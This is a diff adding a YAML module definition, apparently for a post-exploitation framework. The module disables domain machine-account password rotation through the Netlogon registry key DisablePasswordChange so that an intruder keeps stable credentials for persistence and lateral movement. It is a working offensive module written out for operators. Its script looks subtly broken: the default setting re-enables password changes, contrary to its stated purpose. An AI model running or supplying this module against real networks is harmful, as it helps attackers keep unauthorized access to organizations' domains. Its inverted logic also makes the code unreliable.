@@ -1,0 +1,57 @@
+name: Invoke-DisableMachineAcctChange
+authors:
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: |
+  A persistence module that disables automatic machine account password changes
+  to maintain consistent access to domain-joined systems. This technique
+  prevents the system from automatically updating its machine account
+  password, ensuring continued domain authentication capabilities.
+
+  The module modifies the Netlogon service parameters to disable automatic
+  machine account password changes, which normally occur every 30 days by
+  default. By preventing these changes, the operator maintains consistent
+  access to the system's domain credentials and can use them for lateral
+  movement or persistence activities.
+
+  This technique is particularly effective for maintaining long-term access
+  to domain-joined systems as it prevents the natural credential rotation
+  that could otherwise break persistence mechanisms. The module includes
+  cleanup functionality to re-enable automatic password changes when needed.
+software: ''
+tactics: [TA0005, TA0004]
+techniques: [T1098]
+background: false
+output_extension:
+needs_admin: true
+opsec_safe: true
+language: powershell
+min_language_version: '2'
+comments: []
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: CleanUp
+    description: Re-enable machine password changes.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - True
+      - False
+script: |
+  Function Invoke-DisableAccountChange {
+      param
+      (
+          [Parameter(Mandatory = $False)]
+          [int]
+          $Cleanup = 0
+      )
+      $null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value $Cleanup
+      If ($Cleanup -eq 0){'Machine account password change re-enabled.'}
+      else{'Machine account password change disabled.'}
+  }
+script_end: Invoke-DisableAccountChange {{ PARAMS }}
